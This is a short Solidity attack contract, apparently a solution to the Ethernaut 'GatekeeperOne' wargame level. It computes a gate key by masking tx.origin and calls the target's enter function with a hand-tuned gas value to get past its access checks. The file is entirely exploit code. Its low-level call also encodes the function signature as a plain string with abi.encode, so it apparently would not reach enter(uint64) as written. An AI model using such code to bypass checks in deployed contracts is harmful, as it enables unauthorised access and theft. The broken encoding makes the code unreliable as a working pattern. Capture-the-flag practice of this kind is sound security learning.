// SPDX-License-Identifier: MIT
// instance 0xd264040D749d0f4f7928ba39287F9586303361e4
// 819100
pragma solidity ^0.5.0;

import "./GateKeeperOne.sol";

contract GateKeeperOneAttack {

    GateKeeperOne target;
    uint64 key = uint64(tx.origin) & 0xFFFFFFFF0000FFFF;
 

    constructor(address _targetAddress) public {
        target = GateKeeperOne(_targetAddress);
    }

    function GateAttack() public {

        address(target).call.gas(819100 + 1)(abi.encode('enter(uint64)',key));
       
    }
}